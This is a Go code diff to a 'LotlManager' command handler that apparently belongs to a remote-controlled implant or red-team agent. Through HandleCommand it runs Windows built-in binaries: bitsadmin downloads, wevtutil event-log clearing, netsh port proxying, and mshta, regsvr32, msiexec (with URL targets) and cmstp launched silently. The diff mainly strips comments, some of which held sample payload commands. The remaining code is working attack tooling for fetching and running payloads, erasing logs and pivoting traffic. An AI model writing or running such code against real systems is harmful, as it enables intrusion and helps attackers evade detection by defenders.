@@ -47,7 +47,7 @@ func (m *LotlManager) HandleCommand(ctx context.Context, cmd protocol.Command) p
 	case "bitsadmin-download":
 		out, err = m.bitsadminDownload(ctx, payload.Source, payload.Target)
 	case "wevtutil-clear":
-		out, err = m.wevtutilClear(ctx, payload.Target) // Target here is log name
+		out, err = m.wevtutilClear(ctx, payload.Target)
 	case "netsh-portproxy-add":
 		out, err = m.netshPortProxyAdd(ctx, payload.Metadata)
 	case "netsh-portproxy-delete":
@@ -120,7 +120,6 @@ func (m *LotlManager) bitsadminDownload(ctx context.Context, url, dst string) (s
 	if url == "" || dst == "" {
 		return "", fmt.Errorf("url and destination required")
 	}
-	// bitsadmin /transfer myDownloadJob /download /priority normal http://example.com/file.zip C:\path\to\file.zip
 	jobName := fmt.Sprintf("job-%d", time.Now().Unix())
 	cmd := exec.CommandContext(ctx, "bitsadmin.exe", "/transfer", jobName, "/download", "/priority", "normal", url, dst)
 	out, err := cmd.CombinedOutput()
@@ -191,12 +190,12 @@ func (m *LotlManager) scControl(ctx context.Context, serviceName, action string)
 	}
 
 	validActions := map[string]bool{
-		"query":    true,
-		"start":    true,
-		"stop":     true,
-		"pause":    true,
-		"continue": true,
-		"config":   true,
+		"query":       true,
+		"start":       true,
+		"stop":        true,
+		"pause":       true,
+		"continue":    true,
+		"config":      true,
 		"description": true,
 	}
 
@@ -265,17 +264,11 @@ func (m *LotlManager) mshta(ctx context.Context, target string) (string, error) 
 	}
 
 	cmd := exec.CommandContext(ctx, "mshta.exe", target)
-	// mshta usually doesn't return output to stdout, and might hang if it opens a window.
-	// We might want to run it in a way that doesn't block forever if it's an interactive HTA.
-	// For LOTL purposes, it's often used to execute vbscript/jscript.
 	err := cmd.Start()
 	if err != nil {
 		return "", fmt.Errorf("mshta failed to start: %w", err)
 	}
 
-	// We'll wait a bit but not forever? Or just let it run.
-	// Given this is a command handler, we should probably wait for it if we want to know if it worked.
-	// But mshta is tricky. Let's just wait and see.
 	done := make(chan error, 1)
 	go func() {
 		done <- cmd.Wait()
@@ -289,7 +282,6 @@ func (m *LotlManager) mshta(ctx context.Context, target string) (string, error) 
 			return "", fmt.Errorf("mshta failed: %w", err)
 		}
 	case <-time.After(5 * time.Second):
-		// Assume it started successfully if it didn't exit immediately with error
 		return "mshta started and still running (or detached)", nil
 	}
 
@@ -327,7 +319,6 @@ func (m *LotlManager) regsvr32(ctx context.Context, dllPath string, silent, unin
 	if uninstall {
 		execArgs = append(execArgs, "/u")
 	}
-	// /n /i:cmdline can also be used
 	execArgs = append(execArgs, dllPath)
 
 	cmd := exec.CommandContext(ctx, "regsvr32.exe", execArgs...)
@@ -382,8 +373,6 @@ func (m *LotlManager) msiexec(ctx context.Context, target string, silent bool) (
 		return "", fmt.Errorf("target (path or URL) is required")
 	}
 
-	// msiexec /q /i http://server/package.msi
-	// Or for DLL execution: msiexec /y "C:\path\to\your.dll"
 	args := []string{"/i", target}
 	if silent {
 		args = append(args, "/q")
@@ -395,7 +384,6 @@ func (m *LotlManager) msiexec(ctx context.Context, target string, silent bool) (
 		return "", fmt.Errorf("msiexec failed to start: %w", err)
 	}
 
-	// msiexec can take a while. We'll wait a bit.
 	done := make(chan error, 1)
 	go func() {
 		done <- cmd.Wait()
@@ -420,7 +408,6 @@ func (m *LotlManager) cmstp(ctx context.Context, infPath string, silent bool) (s
 		return "", fmt.Errorf("INF path is required")
 	}
 
-	// cmstp.exe /ni /s "C:\path\to\payload.inf"
 	args := []string{"/ni"}
 	if silent {
 		args = append(args, "/s")
